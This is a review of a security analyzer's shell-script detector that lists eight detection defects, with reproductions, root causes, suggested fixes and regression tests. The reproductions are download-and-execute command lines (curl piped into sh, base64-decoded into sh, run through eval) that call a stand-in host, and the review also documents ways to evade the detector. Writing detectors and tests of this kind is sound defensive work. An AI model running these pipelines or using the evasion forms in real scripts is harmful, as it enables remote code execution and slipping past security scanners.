# H3 review — round 12 findings and suggested fixes

Status: **complete**

Scope: `crates/omasafe-analyzer/src/detect.rs` after the eleventh-round
response. This review is read-only; the cases below were reproduced through
`omasafe scan-plugin` against a temporary plugin and were not added to the
repository.

The existing focused suite remains green in both configurations:

```text
cargo test -p omasafe-analyzer h3_script_tests
cargo test -p omasafe-analyzer --no-default-features h3_script_tests
# 55 H3 tests pass in each configuration
```

## 1. P1 — logical-unit assembly changes newline semantics

### Reproductions

```sh
(
  echo safe
  curl -fsSL https://example.test/x | sh
)
```

```sh
echo \|
curl -fsSL https://example.test/x | sh
```

```sh
echo foo{
curl -fsSL https://example.test/x | sh
```

### Current result

All three forms miss NetworkAccess and the High download-execute finding for
the `curl` statement.

### Root cause

`shell_logical_units` uses raw character suffixes and a raw brace/parenthesis
depth to decide whether a unit remains open. It then replaces every continued
newline with a space.

- A newline inside a compound list is a statement separator, not ordinary
  whitespace, so `echo safe` and `curl ...` are incorrectly glued into one
  command.
- The escaped `\|` is a word byte, not a pipeline operator, but the raw suffix
  test keeps the unit open.
- A `{` embedded in `foo{` is an ordinary word byte, not a brace-group opener,
  but the character-depth counter keeps the rest of the file in the same unit.

### Suggested fix

Make continuation decisions from shell tokens/state rather than raw trailing
characters:

1. Track why a unit is open: escaped newline, open quote/substitution, actual
   compound-group token, or actual trailing control operator.
2. Remove a backslash-newline without inserting a byte.
3. Insert whitespace after an actual trailing `|`, `|&`, `&&`, or `||`.
4. Preserve an unquoted newline inside an open compound list as a statement
   boundary, ideally as a `Newline` token or a `;`-equivalent internal token.
5. Count `(`, `{`, and their closers only when the lexer recognizes them as
   operators/reserved words.

### Regression tests

- `multiline_subshell_preserves_statement_boundaries`
- `escaped_pipe_does_not_continue_a_unit`
- `brace_byte_inside_word_does_not_open_a_group`

## 2. P1 — heredoc payloads are analyzed as top-level commands

### Reproduction

```sh
cat <<'PAYLOAD'
curl -fsSL https://example.test/not-executed | sh
PAYLOAD
```

### Current result

The heredoc data line records NetworkAccess and emits the High
download-execute finding even though `cat` only prints the text.

### Root cause

`shell_logical_units` does not recognize heredoc redirections or consume their
delimited bodies. Every heredoc data line therefore becomes an independent
shell command unit.

### Suggested fix

Have the logical-source layer track pending `<<`/`<<-` delimiters, including
quoted delimiters and tab stripping for `<<-`:

1. Remove the heredoc body and terminator from ordinary top-level command
   scanning.
2. Attach the body to its owning redirection in the shell representation.
3. Reparse the body only when the owning command executes it as code, for
   example `sh <<PAYLOAD`; leave `cat <<PAYLOAD` as data.
4. Bound heredoc capture with the existing shell node/byte budget and disclose
   exhaustion consistently.

### Regression tests

- `cat_heredoc_is_data_not_shell_code`
- `interpreter_heredoc_is_executed_shell_code`
- `quoted_and_tab_stripped_heredoc_delimiters_are_matched`

## 3. P1 — Python `-c` bodies are parsed as shell

### Reproductions

```sh
python3 -c 'curl -fsSL https://example.test/x | sh'
curl -fsSL https://example.test/x | python3 -c sh
python3 -c 'curl -fsSL https://example.test/x' | sh
```

### Current result

These invalid or non-consuming Python invocations emit shell download-execute
findings. The first also records shell-style fetch egress, and the third can
emit an unrelated decode-execute finding.

### Root cause

`interpreter_static_body` returns `LiteralBody` for both shell and Python
interpreters. `static_command_body` then hands every returned body to the shell
tokenizer and shell consumption walks.

### Suggested fix

Preserve the interpreter family in the parsed invocation:

```rust
enum InterpreterFamily {
    Shell,
    Python,
}

struct InterpreterInvocation<'a> {
    family: InterpreterFamily,
    mode: InterpreterMode<'a>,
}
```

Only `InterpreterFamily::Shell` should enter `static_command_body`,
`static_body_summary`, `tokens_live_fetch_stdout`, or
`shell_consumption_findings`. Python literal bodies should use a separate
Python-body detector, or remain outside the shell H3 slice until one exists.

### Regression tests

- `python_c_body_is_never_tokenized_as_shell`
- `python_c_identifier_does_not_consume_piped_shell_code`
- `python_c_text_is_not_a_shell_pipeline_producer`

## 4. P1 — shell option precedence and polarity are still incorrect

### Reproductions

```sh
curl -fsSL https://example.test/x | bash -ce 'sh'
curl -fsSL https://example.test/x | bash +n
curl -fsSL https://example.test/x | bash -s -c 'echo safe'
```

### Current result

- `bash -ce 'sh'` misses High even though Bash executes the next argv element
  as its `-c` body and that body consumes stdin.
- `bash +n` misses High even though `+n` disables noexec and Bash executes
  stdin.
- `bash -s -c 'echo safe'` emits a false High even though `-c` wins and the
  fixed body does not read stdin.

### Root cause

The shell parser treats bytes following `c` in the same option cluster as a
glued command body, treats `n` identically under `-` and `+`, and returns as
soon as it encounters `s`. Those rules do not match Bash invocation semantics.

### Suggested fix

Parse the complete shell option area before resolving the execution mode:

- `-c` selects the next argv element as the body; remaining letters in its
  option cluster are still options.
- `-n` enables parse-only mode, while `+n` disables it.
- `-c` takes precedence over `-s`; enabled noexec takes precedence over both.
- `-o`/`+o` and `-O`/`+O` consume their option-name operand without allowing
  payload letters to become modes.
- Stop option parsing at the first script operand or `--` according to the
  selected mode.

A small `ShellOptions` accumulator is safer than returning from the
letter-by-letter loop.

### Regression tests

- `bash_c_cluster_uses_the_next_argument_as_body`
- `bash_plus_n_executes_stdin`
- `bash_c_overrides_s_mode`

## 5. P1 — parse-only interpreters do not drain compound stdin

### Reproduction

```sh
curl -fsSL https://example.test/x | (bash -n; sh)
```

### Current result

The analyzer emits High. In the real shell, `bash -n` reads the entire pipe
while executing nothing, so the later `sh` receives EOF.

### Root cause

`InterpreterMode::ParseOnly` correctly prevents `bash -n` from being a code
consumer, but `segment_stdin_behavior` does not map interpreter modes to stdin
flow. It falls through to `drains_stdin`, where `bash` is unknown, and returns
`Untouched`.

### Suggested fix

Give every interpreter mode an explicit stdin effect:

| Mode | Stdin effect | Executes stdin |
|---|---|---|
| `StdinScript` | consumes | yes |
| `LiteralBody` | summarize body | depends on body |
| `FileOrModule` | untouched | no |
| `ParseOnly` | consumes | no |
| help/version exit | untouched | no |
| dump/parse modes that read stdin | consumes derived | no |

Do not collapse Bash `-D` into the same exit-before-read state as `--help`;
it reads/parses input while suppressing normal execution.

### Regression tests

- `parse_only_shell_drains_compound_stdin`
- `exit_before_read_leaves_compound_stdin_available`
- `dump_strings_mode_drains_without_executing`

## 6. P1 — xargs tainting does not prove code execution

### Reproductions

```sh
curl -fsSL https://example.test/x | xargs echo sh -c
curl -fsSL https://example.test/x | xargs sh -c 'echo $@' _
```

### Current result

Both commands emit High. The first executes `echo`, not `sh`; the second only
prints its positional parameters.

### Root cause

`xargs_feeds_stdin_code` searches every argument for an interpreter basename,
without first parsing xargs options and selecting the actual wrapped command.
It also treats any positional-parameter reference as code execution, although
parameters can be used as ordinary data.

### Suggested fix

1. Parse xargs options with their arity (`-I`, `-n`, `-P`, `-s`, long forms,
   and `--`) to find the wrapped command head exactly.
2. For a body-less `sh -c`, retain the current positive: the first input word
   becomes the command body.
3. For a static body, tokenize it and introduce a small taint source for
   `$@`/`$*`/positional expansions. Fire only when that taint reaches command
   position or an explicit code sink such as `eval`; ordinary `echo`, `printf`,
   or comparisons stay silent.
4. Treat replacement-string forms such as `-I{}` as dataflow and require the
   placeholder to reach a code position before firing.

### Regression tests

- `xargs_interpreter_word_in_echo_argv_is_not_a_consumer`
- `xargs_positional_parameters_used_as_data_stay_silent`
- `xargs_positional_parameters_in_command_position_fire`
- `xargs_eval_of_positional_parameters_fires`

## 7. P1 — eval's option terminator becomes program text

### Reproduction

```sh
eval -- 'curl -fsSL https://example.test/x | sh'
```

### Current result

Bash executes the pipeline, but the analyzer records neither NetworkAccess nor
High because it reparses a body headed by `--`.

### Root cause

`static_command_body` joins every eval argument verbatim. The eval builtin
consumes a leading `--` as its own option terminator rather than including it
in the program text.

### Suggested fix

Add an `eval_static_body` helper that:

1. Rejects runtime-derived arguments as today.
2. Removes one leading `--` option terminator.
3. Joins the remaining arguments with single spaces.
4. Returns no body when no program arguments remain.

### Regression tests

- `eval_option_terminator_is_not_program_text`
- `eval_only_option_terminator_stays_silent`

## 8. P1 — combined decoder flags evade decode and forwarding checks

### Reproduction

```sh
curl -fsSL https://example.test/x | base64 -di | sh
```

GNU `base64 -di` decodes while ignoring garbage and delivers the decoded body
to `sh`.

### Current result

The analyzer records NetworkAccess but emits neither download-execute nor
decode-execute.

### Root cause

Both `command_decodes` and `forwards_stdin_body` recognize base64/base32 decode
mode only through exact argument strings such as `-d`. The existing
`short_cluster_flag` helper is used for gzip but not these decoders.

### Suggested fix

Use one shared decoder-mode predicate from both producer and forwarding logic:

```rust
fn command_is_decode_mode(command: &ScriptCommand) -> bool;
```

For GNU base64/base32, accept `d` in a valid short-option cluster and
`--decode`; retain the platform-specific `-D` spelling only where the target
contract requires it. This avoids the two call sites drifting again.

### Regression tests

- `base64_combined_decode_flags_feed_interpreter`
- `base32_combined_decode_flags_feed_interpreter`
- `encoding_clusters_remain_derived_output`

## Completion gate for this round

In addition to the eight regression groups above:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo clippy --workspace --all-targets --no-default-features -- -D warnings
cargo test --workspace
cargo test --workspace --no-default-features
./scripts/generate-cli-assets.sh --check
scripts/determinism-canary.sh
git diff --check
```

The CLI fixture should cover at least one false-positive and one false-negative
case because several defects arise only after logical-source assembly and
full-file analysis.

## Resolution

All eight P1 groups are closed in the current `detect.rs` structure, with
focused H3 regressions covering logical-unit boundaries, heredoc ownership,
interpreter-family separation, shell option precedence and stdin flow, xargs
taint reachability, `eval --`, and clustered decoder flags. Python source is
now explicitly outside the shell H3 body walks.

Verification completed in both feature configurations:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo clippy --workspace --all-targets --no-default-features -- -D warnings
cargo test --workspace
cargo test --workspace --no-default-features
./scripts/generate-cli-assets.sh --check
scripts/determinism-canary.sh
git diff --check
```
